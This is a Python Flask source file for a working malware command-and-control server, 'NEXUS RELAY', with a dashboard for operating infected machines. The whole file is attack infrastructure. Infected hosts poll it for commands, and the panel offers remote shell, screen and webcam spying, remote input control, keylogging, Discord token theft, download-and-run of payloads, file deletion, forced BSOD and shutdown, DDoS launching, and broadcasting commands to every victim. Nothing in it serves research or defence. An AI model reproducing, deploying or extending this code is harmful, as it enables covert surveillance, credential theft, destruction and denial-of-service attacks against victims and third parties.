import os
import time
import secrets
from collections import deque
from flask import Flask, request, jsonify, session, redirect, Response, render_template_string
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

# ─── Config ───
DASHBOARD_USER = os.environ.get("DASH_USER", "admin")
DASHBOARD_PASS = os.environ.get("DASH_PASS", "admin123")
RELAY_SECRET = os.environ.get("RELAY_SECRET", "changeme-secret-key")

# ─── In-Memory State ───
machines = {}          # machine_id -> {hostname, username, os, private_ip, public_ip, last_seen, stream_active}
command_queues = {}    # machine_id -> deque of {id, command}
results = {}           # machine_id -> deque of {id, command, result, timestamp}
latest_frames = {}     # machine_id -> bytes (JPEG)
interact_queues = {}   # machine_id -> deque of {action, ...}
cmd_counter = 0

def next_cmd_id():
    global cmd_counter
    cmd_counter += 1
    return cmd_counter

def verify_secret():
    s = request.headers.get("X-Secret") or (request.json or {}).get("secret", "")
    return s == RELAY_SECRET

def require_dash_auth(f):
    def wrapper(*args, **kwargs):
        if not session.get("authed"):
            return jsonify({"error": "Not authenticated"}), 401
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

def cleanup_stale():
    """Remove machines not seen in 120s"""
    now = time.time()
    stale = [mid for mid, m in machines.items() if now - m["last_seen"] > 120]
    for mid in stale:
        machines.pop(mid, None)
        command_queues.pop(mid, None)
        results.pop(mid, None)
        latest_frames.pop(mid, None)
        interact_queues.pop(mid, None)

# ═══════════════════════════════════════════════════════════════
#  MACHINE-FACING API  (called by payloads)
# ═══════════════════════════════════════════════════════════════

@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    if not verify_secret():
        return jsonify({"error": "bad secret"}), 403
    d = request.json
    mid = d["machine_id"]
    machines[mid] = {
        "hostname": d.get("hostname", "?"),
        "username": d.get("username", "?"),
        "os": d.get("os", "?"),
        "private_ip": d.get("private_ip", "?"),
        "public_ip": d.get("public_ip", "?"),
        "last_seen": time.time(),
        "stream_active": machines.get(mid, {}).get("stream_active", False),
    }
    if mid not in command_queues:
        command_queues[mid] = deque(maxlen=100)
    if mid not in results:
        results[mid] = deque(maxlen=200)
    if mid not in interact_queues:
        interact_queues[mid] = deque(maxlen=50)
    cleanup_stale()
    return jsonify({"ok": True, "stream_requested": machines[mid]["stream_active"]})

@app.route("/api/poll/<machine_id>", methods=["GET"])
def poll(machine_id):
    if not verify_secret():
        return jsonify({"error": "bad secret"}), 403
    q = command_queues.get(machine_id)
    if q:
        cmd = q.popleft()
        return jsonify({"command": cmd["command"], "id": cmd["id"]})
    iq = interact_queues.get(machine_id)
    if iq:
        act = iq.popleft()
        return jsonify({"interact": act})
    return jsonify({})

@app.route("/api/result", methods=["POST"])
def push_result():
    if not verify_secret():
        return jsonify({"error": "bad secret"}), 403
    d = request.json
    mid = d["machine_id"]
    if mid not in results:
        results[mid] = deque(maxlen=200)
    results[mid].append({
        "id": d.get("id"),
        "command": d.get("command", ""),
        "result": d.get("result", ""),
        "timestamp": time.time(),
    })
    return jsonify({"ok": True})

@app.route("/api/frame/<machine_id>", methods=["POST"])
def push_frame(machine_id):
    s = request.headers.get("X-Secret", "")
    if s != RELAY_SECRET:
        return "forbidden", 403
    latest_frames[machine_id] = request.data
    return "ok"

# ═══════════════════════════════════════════════════════════════
#  DASHBOARD-FACING API  (called by the web UI)
# ═══════════════════════════════════════════════════════════════

@app.route("/login", methods=["POST"])
def login():
    d = request.json or {}
    if d.get("username") == DASHBOARD_USER and d.get("password") == DASHBOARD_PASS:
        session["authed"] = True
        return jsonify({"success": True})
    return jsonify({"success": False}), 401

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")

@app.route("/dash/machines", methods=["GET"])
@require_dash_auth
def list_machines():
    cleanup_stale()
    now = time.time()
    out = []
    for mid, m in machines.items():
        out.append({
            "id": mid,
            "hostname": m["hostname"],
            "username": m["username"],
            "os": m["os"],
            "private_ip": m["private_ip"],
            "public_ip": m["public_ip"],
            "ago": int(now - m["last_seen"]),
            "stream_active": m["stream_active"],
        })
    out.sort(key=lambda x: x["ago"])
    return jsonify(out)

@app.route("/dash/command", methods=["POST"])
@require_dash_auth
def send_command():
    d = request.json
    mid = d.get("machine_id")
    cmd = d.get("command", "").strip()
    if not mid or mid not in machines:
        return jsonify({"error": "Machine not found"}), 404
    cid = next_cmd_id()
    command_queues[mid].append({"id": cid, "command": cmd})
    return jsonify({"ok": True, "id": cid})

@app.route("/dash/command/all", methods=["POST"])
@require_dash_auth
def send_command_all():
    d = request.json
    cmd = d.get("command", "").strip()
    ids = []
    for mid in machines:
        cid = next_cmd_id()
        command_queues[mid].append({"id": cid, "command": cmd})
        ids.append(cid)
    return jsonify({"ok": True, "ids": ids, "count": len(ids)})

@app.route("/dash/results/<machine_id>", methods=["GET"])
@require_dash_auth
def get_results(machine_id):
    r = results.get(machine_id, deque())
    since = float(request.args.get("since", 0))
    out = [x for x in r if x["timestamp"] > since]
    return jsonify(out)

@app.route("/dash/interact/<machine_id>", methods=["POST"])
@require_dash_auth
def send_interact(machine_id):
    if machine_id not in machines:
        return jsonify({"error": "not found"}), 404
    d = request.json
    if machine_id not in interact_queues:
        interact_queues[machine_id] = deque(maxlen=50)
    interact_queues[machine_id].append(d)
    return jsonify({"ok": True})

@app.route("/dash/stream/toggle/<machine_id>", methods=["POST"])
@require_dash_auth
def toggle_stream(machine_id):
    if machine_id not in machines:
        return jsonify({"error": "not found"}), 404
    machines[machine_id]["stream_active"] = not machines[machine_id]["stream_active"]
    return jsonify({"active": machines[machine_id]["stream_active"]})

@app.route("/dash/stream/<machine_id>")
def stream_feed(machine_id):
    if not session.get("authed"):
        return "auth required", 401
    def gen():
        while True:
            frame = latest_frames.get(machine_id)
            if frame:
                yield (b"--frame\r\nContent-Type: image/jpeg\r\nContent-Length: "
                       + str(len(frame)).encode() + b"\r\n\r\n" + frame + b"\r\n")
            time.sleep(0.15)
    return Response(gen(), mimetype="multipart/x-mixed-replace; boundary=frame")

# ═══════════════════════════════════════════════════════════════
#  DASHBOARD HTML
# ═══════════════════════════════════════════════════════════════

LOGIN_PAGE = '''<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NEXUS // Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600&family=Inter:wght@300;400;600;800&display=swap');
body{font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;
background:#050510;overflow:hidden}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 30% 20%,rgba(99,102,241,.08),transparent 50%),
radial-gradient(ellipse at 70% 80%,rgba(168,85,247,.06),transparent 50%);pointer-events:none}
.box{background:rgba(15,15,35,.6);backdrop-filter:blur(40px);border:1px solid rgba(99,102,241,.15);
border-radius:24px;padding:48px;width:380px;box-shadow:0 25px 60px rgba(0,0,0,.5);animation:pop .6s cubic-bezier(.16,1,.3,1)}
@keyframes pop{from{opacity:0;transform:translateY(30px) scale(.95)}to{opacity:1;transform:none}}
h1{font-size:28px;font-weight:800;text-align:center;margin-bottom:8px;
background:linear-gradient(135deg,#6366f1,#a855f7,#6366f1);background-size:200%;
-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:sh 3s linear infinite}
@keyframes sh{0%{background-position:0%}100%{background-position:200%}}
p{text-align:center;color:rgba(255,255,255,.4);font-size:13px;margin-bottom:32px}
.f{position:relative;margin-bottom:20px}
.f input{width:100%;padding:14px 16px;background:rgba(0,0,0,.3);border:1px solid rgba(99,102,241,.2);
color:#fff;border-radius:12px;font-size:14px;outline:none;transition:.3s}
.f input:focus{border-color:rgba(99,102,241,.6);box-shadow:0 0 20px rgba(99,102,241,.1)}
.f label{position:absolute;top:-8px;left:12px;font-size:11px;color:rgba(99,102,241,.7);background:rgba(15,15,35,.8);padding:0 6px;border-radius:4px}
button{width:100%;padding:14px;background:linear-gradient(135deg,#6366f1,#8b5cf6);border:none;border-radius:12px;
color:#fff;font-size:15px;font-weight:600;cursor:pointer;transition:.3s;margin-top:8px}
button:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(99,102,241,.3)}
.err{color:#f87171;text-align:center;font-size:13px;margin-top:12px;display:none}
</style></head><body>
<div class="box"><h1>NEXUS RELAY</h1><p>Central command authentication</p>
<form onsubmit="return go()">
<div class="f"><label>USERNAME</label><input id="u" value="admin" required></div>
<div class="f"><label>PASSWORD</label><input id="p" type="password" placeholder="Password" required></div>
<button type="submit">ACCESS SYSTEM</button></form>
<div class="err" id="e">Access denied</div></div>
<script>function go(){fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({username:document.getElementById('u').value,password:document.getElementById('p').value})})
.then(r=>r.json()).then(d=>{if(d.success)location='/';else document.getElementById('e').style.display='block'})
.catch(()=>{document.getElementById('e').style.display='block'});return false}</script>
</body></html>'''

DASHBOARD_PAGE = r'''<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NEXUS // Relay Control</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500&family=Inter:wght@300;400;600;800&display=swap');
:root{--p:99,102,241;--a:168,85,247;--glass:rgba(15,15,35,.45);--gb:rgba(99,102,241,.12);
--text:rgba(255,255,255,.9);--dim:rgba(255,255,255,.5);--r:16px;--blur:20px}
body{font-family:'Inter',sans-serif;background:#050510;color:var(--text);min-height:100vh;overflow-x:hidden}
body::before{content:'';position:fixed;inset:0;
background:radial-gradient(ellipse at 20% 0%,rgba(var(--p),.07),transparent 50%),
radial-gradient(ellipse at 80% 100%,rgba(var(--a),.05),transparent 50%);pointer-events:none}

.ct{max-width:1500px;margin:0 auto;padding:24px;position:relative;z-index:1}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;animation:sd .6s cubic-bezier(.16,1,.3,1)}
.header h1{font-size:30px;font-weight:800;background:linear-gradient(135deg,#6366f1,#a855f7,#ec4899);background-size:200%;
-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:sh 4s linear infinite}
@keyframes sh{0%{background-position:0%}100%{background-position:200%}}
@keyframes sd{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:none}}
@keyframes su{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(74,222,128,.4)}50%{opacity:.7;box-shadow:0 0 0 6px rgba(74,222,128,0)}}
.ha{display:flex;gap:12px;align-items:center}

.glass{background:var(--glass);backdrop-filter:blur(var(--blur));-webkit-backdrop-filter:blur(var(--blur));
border:1px solid var(--gb);border-radius:var(--r);padding:20px;transition:.3s cubic-bezier(.4,0,.2,1);position:relative;overflow:hidden}
.glass::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.02),transparent 50%);pointer-events:none}
.glass:hover{border-color:rgba(var(--p),.25);box-shadow:0 8px 32px rgba(0,0,0,.2)}
.stitle{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:rgb(var(--p));margin-bottom:14px;display:flex;align-items:center;gap:8px}
.stitle::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,rgba(var(--p),.2),transparent)}

.btn{padding:10px 18px;background:rgba(var(--p),.08);backdrop-filter:blur(12px);border:1px solid rgba(var(--p),.2);
color:#fff;border-radius:10px;cursor:pointer;font-size:12px;font-weight:600;letter-spacing:.3px;
transition:.25s cubic-bezier(.4,0,.2,1);white-space:nowrap;display:inline-flex;align-items:center;gap:6px}
.btn:hover{background:rgba(var(--p),.18);border-color:rgba(var(--p),.4);transform:translateY(-2px);box-shadow:0 8px 24px rgba(var(--p),.15)}
.btn:active{transform:translateY(0)}
.btn-a{background:rgba(var(--a),.08);border-color:rgba(var(--a),.2)}
.btn-a:hover{background:rgba(var(--a),.18);border-color:rgba(var(--a),.4);box-shadow:0 8px 24px rgba(var(--a),.15)}
.btn-d{background:rgba(239,68,68,.08);border-color:rgba(239,68,68,.2)}
.btn-d:hover{background:rgba(239,68,68,.18);border-color:rgba(239,68,68,.4);box-shadow:0 8px 24px rgba(239,68,68,.15)}
.btn-s{background:rgba(34,197,94,.08);border-color:rgba(34,197,94,.2)}
.btn-s:hover{background:rgba(34,197,94,.18);border-color:rgba(34,197,94,.4)}
.btn-lo{background:rgba(255,255,255,.03);border-color:rgba(255,255,255,.1)}
.btn-lo:hover{background:rgba(239,68,68,.1);border-color:rgba(239,68,68,.3)}
.btn-sm{padding:7px 12px;font-size:11px;border-radius:8px}
.bg{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px}

/* Machine Cards */
.machines{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin-bottom:20px}
.mcard{background:rgba(var(--p),.04);border:1px solid rgba(var(--p),.1);border-radius:12px;padding:16px;
cursor:pointer;transition:.3s;position:relative}
.mcard:hover{border-color:rgba(var(--p),.3);background:rgba(var(--p),.08);transform:translateY(-2px)}
.mcard.active{border-color:rgba(var(--p),.5);background:rgba(var(--p),.12);box-shadow:0 0 20px rgba(var(--p),.1)}
.mcard .dot{width:8px;height:8px;border-radius:50%;background:#4ade80;display:inline-block;margin-right:8px;animation:pulse 2s infinite}
.mcard .dot.stale{background:#f59e0b;animation:none}
.mcard h4{font-size:14px;margin-bottom:6px}
.mcard .meta{font-size:11px;color:var(--dim);line-height:1.6}

/* Grid */
.grid{display:grid;gap:20px;margin-bottom:20px}
.grid-2{grid-template-columns:1fr 1fr}

/* Video */
.vwrap{position:relative;border-radius:12px;overflow:hidden;background:#000;aspect-ratio:16/9;cursor:crosshair}
.vwrap img{width:100%;height:100%;object-fit:contain;display:block}
.vbadge{position:absolute;bottom:10px;left:10px;padding:4px 10px;background:rgba(0,0,0,.6);backdrop-filter:blur(8px);
border-radius:6px;font-size:11px;font-weight:600;color:#fff;border:1px solid rgba(255,255,255,.1)}

/* Console */
.console{background:rgba(0,0,0,.4);border:1px solid rgba(var(--p),.1);border-radius:12px;padding:16px;
font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.8;color:#4ade80;
min-height:400px;max-height:600px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;
scrollbar-width:thin;scrollbar-color:rgba(var(--p),.3) transparent}
.console::-webkit-scrollbar{width:6px}
.console::-webkit-scrollbar-thumb{background:rgba(var(--p),.3);border-radius:10px}

.input{padding:10px 14px;background:rgba(0,0,0,.3);border:1px solid rgba(var(--p),.15);
color:#fff;border-radius:10px;font-size:13px;outline:none;transition:.3s;width:100%}
.input:focus{border-color:rgba(var(--p),.5);box-shadow:0 0 20px rgba(var(--p),.08)}

.click-ripple{position:absolute;width:20px;height:20px;border:2px solid rgba(var(--p),.8);border-radius:50%;
animation:rip .6s ease-out forwards;pointer-events:none;z-index:99}
@keyframes rip{to{width:40px;height:40px;opacity:0;margin:-10px}}
.anim-1{animation:su .5s cubic-bezier(.16,1,.3,1) .1s both}
.anim-2{animation:su .5s cubic-bezier(.16,1,.3,1) .2s both}
.anim-3{animation:su .5s cubic-bezier(.16,1,.3,1) .3s both}
.anim-4{animation:su .5s cubic-bezier(.16,1,.3,1) .4s both}
.anim-5{animation:su .5s cubic-bezier(.16,1,.3,1) .5s both}
.nopc{text-align:center;padding:60px;color:var(--dim);font-size:14px}
select{padding:10px 14px;background:rgba(0,0,0,.4);border:1px solid rgba(var(--p),.2);color:#fff;border-radius:10px;
font-size:13px;outline:none;cursor:pointer;transition:.3s}
select:focus{border-color:rgba(var(--p),.5)}
@media(max-width:1024px){.grid-2{grid-template-columns:1fr}.console{min-height:250px;max-height:350px}}
</style></head>
<body>
<div class="ct">
  <div class="header">
    <h1>NEXUS RELAY</h1>
    <div class="ha">
      <span style="font-size:12px;color:var(--dim)" id="mcountLabel">0 machines</span>
      <button class="btn btn-lo" onclick="location='/logout'">Logout</button>
    </div>
  </div>

  <!-- Machine Selector -->
  <div class="glass anim-1" style="margin-bottom:20px">
    <div class="stitle">CONNECTED MACHINES</div>
    <div class="machines" id="machineList"><div class="nopc">Waiting for machines to connect...</div></div>
  </div>

  <!-- Main Controls (hidden until machine selected) -->
  <div id="controlPanel" style="display:none">

  <div class="grid grid-2 anim-2">
    <!-- Video -->
    <div class="glass">
      <div class="stitle">LIVE FEED — <span id="selName" style="color:#a855f7">?</span></div>
      <div class="vwrap" id="videoWrap">
        <img id="videoStream" src="" alt="No stream"/>
        <div class="vbadge" id="srcBadge">SCREEN</div>
      </div>
      <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
        <button class="btn btn-sm" onclick="switchSrc('screen')">Screen</button>
        <button class="btn btn-sm btn-a" onclick="switchSrc('webcam')">Webcam</button>
        <button class="btn btn-sm btn-s" id="streamBtn" onclick="toggleStream()">Start Stream</button>
        <button class="btn btn-sm btn-s" id="interactBtn" onclick="toggleInteract()">Enable Interact</button>
      </div>
      <p style="margin-top:8px;font-size:11px;color:var(--dim)">Start stream first. Enable interact to send mouse/keyboard.</p>
    </div>

    <!-- Console -->
    <div class="glass">
      <div class="stitle">OUTPUT CONSOLE</div>
      <div class="console" id="output">Select a machine to begin...\n</div>
      <div style="display:flex;gap:8px;margin-top:12px">
        <input class="input" id="shellInput" placeholder="Type shell command..." onkeydown="if(event.key==='Enter')runShell()">
        <button class="btn" onclick="runShell()">Run</button>
        <button class="btn btn-sm btn-d" onclick="clearOut()">Clear</button>
      </div>
    </div>
  </div>

  <!-- SYSTEM -->
  <div class="glass anim-3" style="margin-top:20px">
    <div class="stitle">SYSTEM</div>
    <div class="bg">
      <button class="btn" onclick="exec('screenshot')">Screenshot</button>
      <button class="btn" onclick="exec('webcam_snap')">Webcam Snap</button>
      <button class="btn" onclick="exec('tasklist')">Processes</button>
      <button class="btn" onclick="exec('ip')">IP Info</button>
      <button class="btn" onclick="exec('sysinfo')">System Info</button>
      <button class="btn" onclick="exec('clipboard')">Clipboard</button>
      <button class="btn" onclick="exec('inputs')">Audio In</button>
      <button class="btn" onclick="exec('outputs')">Audio Out</button>
      <button class="btn" onclick="pe('volume','Volume 0-100')">Volume</button>
      <button class="btn" onclick="exec('lock')">Lock</button>
      <button class="btn" onclick="exec('sleep')">Sleep</button>
      <button class="btn" onclick="pe('openlink','URL to open')">Open Link</button>
    </div>
  </div>

  <!-- FILES -->
  <div class="glass anim-3" style="margin-top:20px">
    <div class="stitle">FILE OPERATIONS</div>
    <div class="bg">
      <button class="btn" onclick="pe('list','Directory path')">List Dir</button>
      <button class="btn" onclick="pe('delete','Path to delete')">Delete</button>
      <button class="btn" onclick="pe('rename','old|new (pipe sep)')">Rename</button>
      <button class="btn btn-a" onclick="pe('upload','URL to download & run')">Upload & Run</button>
      <button class="btn btn-a" onclick="pe('download','url|save_path')">Download</button>
    </div>
  </div>

  <!-- PROCESS -->
  <div class="glass anim-4" style="margin-top:20px">
    <div class="stitle">PROCESS MANAGEMENT</div>
    <div class="bg">
      <button class="btn" onclick="pe('kill','Name or PID')">Kill</button>
      <button class="btn" onclick="pe('run','Path/command')">Run</button>
      <button class="btn" onclick="pe('run_silent','Path (hidden)')">Run Silent</button>
      <button class="btn" onclick="pe('start','Search process')">Find</button>
    </div>
  </div>

  <!-- RECON -->
  <div class="glass anim-4" style="margin-top:20px">
    <div class="stitle">RECONNAISSANCE</div>
    <div class="bg">
      <button class="btn" onclick="exec('token')">Discord Tokens</button>
      <button class="btn btn-s" onclick="exec('keylogger_start')">Start Keylogger</button>
      <button class="btn btn-d" onclick="exec('keylogger_stop')">Stop Keylogger</button>
      <button class="btn btn-a" onclick="exec('keylogger_view')">View Keylogs</button>
      <button class="btn" onclick="pe('playsound','Audio URL')">Play Sound</button>
    </div>
  </div>

  <!-- CRITICAL -->
  <div class="glass anim-5" style="margin-top:20px">
    <div class="stitle">CRITICAL</div>
    <div class="bg">
      <button class="btn btn-d" onclick="ce('shutdown','SHUTDOWN?')">Shutdown</button>
      <button class="btn btn-d" onclick="ce('restart','RESTART?')">Restart</button>
      <button class="btn btn-d" onclick="ce('bsod','Trigger BSOD?')">BSOD</button>
      <button class="btn btn-d" onclick="ce('restartpayload','Restart payload?')">Restart Payload</button>
      <button class="btn btn-a" onclick="pe('ddos','url|threads')">DDoS</button>
      <button class="btn btn-d" onclick="exec('stopddos')">Stop DDoS</button>
    </div>
  </div>

  <!-- BROADCAST -->
  <div class="glass anim-5" style="margin-top:20px">
    <div class="stitle">BROADCAST TO ALL MACHINES</div>
    <div style="display:flex;gap:8px">
      <input class="input" id="broadcastInput" placeholder="Command to send to ALL machines...">
      <button class="btn btn-a" onclick="broadcast()">Send All</button>
    </div>
  </div>

  </div><!-- /controlPanel -->
</div>

<script>
let sel=null, buf=[], interact=false, streaming=false, resultTs=0, pollIv=null, srcMode='screen';

function log(t){buf.push('['+new Date().toLocaleTimeString()+'] '+t);if(buf.length>500)buf=buf.slice(-400);
const o=document.getElementById('output');o.textContent=buf.join('\n');o.scrollTop=o.scrollHeight;}
function clearOut(){buf=[];document.getElementById('output').textContent='Cleared.\n';}

async function refreshMachines(){
  try{const r=await fetch('/dash/machines');const ms=await r.json();
  const c=document.getElementById('machineList');
  document.getElementById('mcountLabel').textContent=ms.length+' machine'+(ms.length!==1?'s':'');
  if(!ms.length){c.innerHTML='<div class="nopc">Waiting for machines...</div>';return;}
  c.innerHTML=ms.map(m=>`<div class="mcard ${sel===m.id?'active':''}" onclick="selectMachine('${m.id}','${m.hostname}')">
    <h4><span class="dot ${m.ago>30?'stale':''}"></span>${m.hostname}</h4>
    <div class="meta">${m.username} · ${m.os}<br>${m.private_ip} / ${m.public_ip}<br>Last seen: ${m.ago}s ago</div>
  </div>`).join('');}catch(e){}}

function selectMachine(id,name){
  sel=id;resultTs=time.now||0;resultTs=Date.now()/1000-5;
  document.getElementById('controlPanel').style.display='block';
  document.getElementById('selName').textContent=name;
  buf=[];log('Connected to '+name+' ('+id+')');
  refreshMachines();
  if(pollIv)clearInterval(pollIv);
  pollIv=setInterval(pollResults,2000);
  pollResults();
  // Reset stream state
  streaming=false;interact=false;
  document.getElementById('streamBtn').textContent='Start Stream';
  document.getElementById('interactBtn').textContent='Enable Interact';
  document.getElementById('videoStream').src='';
}

async function pollResults(){
  if(!sel)return;
  try{const r=await fetch('/dash/results/'+sel+'?since='+resultTs);const rs=await r.json();
  rs.forEach(x=>{resultTs=Math.max(resultTs,x.timestamp);log(x.result||'(no output)');});}catch(e){}}

async function exec(cmd){
  if(!sel)return log('No machine selected');
  log('> '+cmd);
  try{await fetch('/dash/command',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({machine_id:sel,command:cmd})});}catch(e){log('ERR: '+e.message);}}

function pe(cmd,msg){const v=prompt(msg);if(v!==null&&v.trim())exec(cmd+':'+v.trim());}
function ce(cmd,msg){if(confirm(msg))exec(cmd);}

async function runShell(){const i=document.getElementById('shellInput');const c=i.value.trim();if(!c)return;i.value='';exec('shell:'+c);}

async function broadcast(){const i=document.getElementById('broadcastInput');const c=i.value.trim();if(!c)return;i.value='';
log('BROADCAST > '+c);
try{const r=await fetch('/dash/command/all',{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({command:c})});const d=await r.json();log('Sent to '+d.count+' machines');}catch(e){log('ERR: '+e.message);}}

function switchSrc(s){srcMode=s;exec('set_source:'+s);document.getElementById('srcBadge').textContent=s.toUpperCase();}

async function toggleStream(){
  if(!sel)return;
  try{const r=await fetch('/dash/stream/toggle/'+sel,{method:'POST'});const d=await r.json();
  streaming=d.active;
  document.getElementById('streamBtn').textContent=streaming?'Stop Stream':'Start Stream';
  document.getElementById('streamBtn').className=streaming?'btn btn-sm btn-d':'btn btn-sm btn-s';
  if(streaming){document.getElementById('videoStream').src='/dash/stream/'+sel+'?t='+Date.now();}
  else{document.getElementById('videoStream').src='';}
  log(streaming?'Stream started':'Stream stopped');}catch(e){log('ERR: '+e.message);}}

function toggleInteract(){interact=!interact;
document.getElementById('interactBtn').textContent=interact?'Disable Interact':'Enable Interact';
document.getElementById('interactBtn').className=interact?'btn btn-sm btn-d':'btn btn-sm btn-s';
log(interact?'Interact ON':'Interact OFF');}

const vw=document.getElementById('videoWrap');
vw.addEventListener('click',function(e){if(!interact||!sel)return;
const r=this.getBoundingClientRect();const x=(e.clientX-r.left)/r.width;const y=(e.clientY-r.top)/r.height;
const rip=document.createElement('div');rip.className='click-ripple';
rip.style.left=(e.clientX-r.left-10)+'px';rip.style.top=(e.clientY-r.top-10)+'px';this.appendChild(rip);setTimeout(()=>rip.remove(),600);
fetch('/dash/interact/'+sel,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({action:'click',x,y,button:e.button===2?'right':'left'})});});
vw.addEventListener('dblclick',function(e){if(!interact||!sel)return;
const r=this.getBoundingClientRect();
fetch('/dash/interact/'+sel,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({action:'dblclick',x:(e.clientX-r.left)/r.width,y:(e.clientY-r.top)/r.height})});});
vw.addEventListener('contextmenu',function(e){if(interact)e.preventDefault();});
document.addEventListener('keydown',function(e){if(!interact||!sel||document.activeElement.tagName==='INPUT')return;
e.preventDefault();fetch('/dash/interact/'+sel,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({action:'key',key:e.key,ctrl:e.ctrlKey,alt:e.altKey,shift:e.shiftKey})});});

setInterval(refreshMachines,5000);
refreshMachines();
</script></body></html>'''

@app.route("/")
def index():
    if not session.get("authed"):
        return LOGIN_PAGE, 401
    return render_template_string(DASHBOARD_PAGE)

# Health check / keep-alive
@app.route("/health")
def health():
    return jsonify({"status": "ok", "machines": len(machines)})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
